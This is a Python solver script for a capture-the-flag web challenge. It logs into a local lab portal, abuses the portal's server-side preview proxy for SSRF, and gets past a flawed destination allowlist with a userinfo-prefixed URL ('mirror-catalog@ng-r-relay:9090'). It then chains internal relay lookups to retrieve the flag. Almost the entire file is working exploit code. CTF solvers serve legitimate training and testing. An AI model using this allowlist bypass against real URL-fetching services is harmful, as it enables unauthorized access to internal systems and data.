#!/usr/bin/env python3
"""Black-box solver for MIRROR GATE V3 (VANTA//SYSTEMS, MG-03).

The solver only talks to the public portal entry point. It reproduces the
intended player path for V3 (SSRF + provenance correlation):

  1. authenticate as the operator (session cookie + CSRF),
  2. read the synchronization journal and extract the correlation ID
     (TRC-....-....) from a real portal response,
  3. use the server-side preview proxy (POST /api/preview) and defeat the
     flawed SOURCE-GUARD 1.2 authorization policy with a userinfo-prefixed URL
     (http://mirror-catalog@ng-r-relay:9090/) so the business check approves it
     while the HTTP engine still contacts the real host ng-r-relay,
  4. look up the trace for that correlation ID on NG-R, extract the opaque
     allocation handle it points to,
  5. follow that handle to the allocation record and read the flag.

Nothing is hard-coded except the public hints a player also has: the operator
credentials (also printed in challenge.yml) and the userinfo bypass technique.
The correlation ID, the opaque handle and the flag are all discovered at
runtime from real responses. The solver never reads challenge files,
environment variables or Docker state, and never talks to the internal
services directly.

Usage:
    python3 solve.py [--base-url http://127.0.0.1:8082] \
                     [--username operator.mg-041] [--password MG-041-2147] \
                     [--timeout 15]

Exit code 0 on success (well-formed flag recovered), non-zero otherwise.
"""

from __future__ import annotations

import argparse
import http.cookiejar
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

# The business validator SOURCE-GUARD 1.2 approves an authority that *starts*
# with an approved source identifier, comparing the raw netloc and never
# splitting userinfo from the host. Prefixing the real target with
# "mirror-catalog@" therefore satisfies it, while the modernised HTTP engine
# resolves and contacts the effective host ng-r-relay.
RELAY_AUTHORITY = "mirror-catalog@ng-r-relay:9090"
RELAY_ROOT = f"http://{RELAY_AUTHORITY}/"
FLAG_RE = re.compile(r"FPS\{[^}]+\}")
CORRELATION_RE = re.compile(r"TRC-\d{4}-\d{4}")
CSRF_FORM_RE = re.compile(r'name="csrf_token"\s+value="([^"]+)"')
CSRF_META_RE = re.compile(r'name="csrf-token"\s+content="([^"]+)"')


class SolveError(RuntimeError):
    """Raised when a step cannot be completed."""


class Portal:
    """A browser-like session against the public MIRROR GATE portal."""

    def __init__(self, base_url: str, timeout: float):
        self.base = base_url.rstrip("/")
        self.timeout = timeout
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar),
            urllib.request.ProxyHandler({}),  # ignore ambient proxies
        )
        self.csrf: str | None = None

    def _open(self, request: urllib.request.Request):
        try:
            return self.opener.open(request, timeout=self.timeout)
        except urllib.error.HTTPError as error:
            return error  # inspected by the caller
        except (urllib.error.URLError, TimeoutError, OSError) as error:
            raise SolveError(f"portal unreachable at {self.base}: {error}") from error

    def get(self, path: str) -> tuple[int, str]:
        response = self._open(urllib.request.Request(self.base + path, method="GET"))
        return response.status, response.read().decode("utf-8", "replace")

    def login(self, username: str, password: str) -> None:
        # 1. anonymous session + CSRF token from the login form
        status, page = self.get("/login")
        if status != 200:
            raise SolveError(f"GET /login returned HTTP {status}")
        match = CSRF_FORM_RE.search(page)
        if not match:
            raise SolveError("no CSRF token on the login form")
        form = urllib.parse.urlencode(
            {"csrf_token": match.group(1), "username": username, "password": password}
        ).encode()
        request = urllib.request.Request(self.base + "/login", data=form, method="POST")
        response = self._open(request)
        # Flask issues 303 on success; urllib follows it to the dashboard (200).
        if response.status == 401:
            raise SolveError("authentication rejected (check --username/--password)")
        if response.status != 200:
            raise SolveError(f"unexpected login status HTTP {response.status}")
        # 2. authenticated CSRF token (meta tag) required for the preview API
        _, dashboard = self.get("/preview")
        meta = CSRF_META_RE.search(dashboard)
        if not meta:
            raise SolveError("authenticated session did not expose a CSRF token")
        self.csrf = meta.group(1)

    def preview(self, url: str) -> dict:
        """Fetch a URL through the portal proxy; return the decoded JSON result."""
        if not self.csrf:
            raise SolveError("not authenticated")
        body = json.dumps({"url": url}).encode()
        request = urllib.request.Request(
            self.base + "/api/preview",
            data=body,
            headers={"Content-Type": "application/json", "X-CSRF-Token": self.csrf},
            method="POST",
        )
        response = self._open(request)
        try:
            payload = json.loads(response.read().decode("utf-8", "replace"))
        except ValueError as error:
            raise SolveError("portal returned a non-JSON preview response") from error
        if not payload.get("ok"):
            raise SolveError(
                f"preview refused for {url}: {payload.get('error')} ({payload.get('message')})"
            )
        return payload

    def preview_json(self, url: str) -> dict:
        result = self.preview(url)
        if result.get("upstream_status") != 200:
            raise SolveError(f"{url} returned upstream status {result.get('upstream_status')}")
        try:
            return json.loads(result["body"])
        except (ValueError, KeyError) as error:
            raise SolveError(f"{url} did not return JSON") from error


def relay_url(path: str) -> str:
    """Build a bypass URL for an NG-R path (path starts with '/')."""
    return f"http://{RELAY_AUTHORITY}{path}"


def solve(base_url: str, username: str, password: str, timeout: float) -> str:
    portal = Portal(base_url, timeout)

    portal.login(username, password)
    print(f"[+] Authenticated as {username}")

    # Phase 1a: read the journal and extract the correlation ID from a real
    # portal response (never hard-coded).
    _, journal = portal.get("/journal")
    match = CORRELATION_RE.search(journal)
    if not match:
        raise SolveError("no correlation ID (TRC-....-....) found in the journal")
    correlation_id = match.group(0)
    print(f"[+] Correlation ID from journal: {correlation_id}")

    # Phase 1b: sanity — a direct NG-R request must be refused by the business
    # validator, documenting the differential behaviour the challenge relies on.
    try:
        portal.preview("http://ng-r-relay:9090/")
        print("[!] direct NG-R request was NOT refused (unexpected)")
    except SolveError as error:
        if "DESTINATION_NOT_APPROVED" in str(error):
            print("[+] Direct NG-R refused (DESTINATION_NOT_APPROVED), as expected")
        else:
            raise

    # Phase 1c: SSRF via the userinfo bypass; discover the trace registry.
    index = portal.preview_json(RELAY_ROOT)
    print(f"[+] NG-R relay reached via bypass: {index.get('service')} v{index.get('version')}")
    if "/v1/traces" not in index.get("resources", []):
        raise SolveError("relay index does not advertise /v1/traces")
    registry = portal.preview_json(relay_url("/v1/traces"))
    lookup = registry.get("lookup", "/v1/traces/{trace_id}")
    print(f"[+] Trace registry lookup convention: {lookup}")

    # Phase 2a: correlate — resolve the journal's correlation ID to an opaque
    # allocation handle (discovered at runtime, never hard-coded).
    trace_path = lookup.replace("{trace_id}", correlation_id)
    trace = portal.preview_json(relay_url(trace_path))
    href = trace.get("allocation_href")
    handle = trace.get("allocation_handle")
    if not href or not handle:
        raise SolveError(f"trace {correlation_id} did not yield an allocation handle")
    print(f"[+] Trace {correlation_id} → job {trace.get('synchronization_job')}, "
          f"handle {handle}")

    # Phase 2b: follow the handle to the allocation record and read the flag.
    record = portal.preview_json(relay_url(href))
    flag = record.get("flag")
    if not (isinstance(flag, str) and FLAG_RE.fullmatch(flag)):
        raise SolveError(f"allocation {handle} did not expose a well-formed flag")
    print(f"[+] Allocation {record.get('allocation_id')} via handle "
          f"(identity={record.get('source_identity')}, "
          f"state={record.get('allocation_state')}, "
          f"eidolon={record.get('eidolon_status')}, "
          f"archive={record.get('archive_reference')})")
    return flag


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="http://127.0.0.1:8082",
                        help="Public base URL of the portal (default: %(default)s).")
    parser.add_argument("--username", default="operator.mg-041",
                        help="Operator username (default: %(default)s).")
    parser.add_argument("--password", default="MG-041-2147",
                        help="Operator password (default: %(default)s).")
    parser.add_argument("--timeout", type=float, default=15.0,
                        help="Per-request timeout in seconds (default: %(default)s).")
    args = parser.parse_args()

    try:
        flag = solve(args.base_url, args.username, args.password, args.timeout)
    except SolveError as error:
        print(f"[-] FAILED: {error}", file=sys.stderr)
        return 1

    print(f"\nFLAG: {flag}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
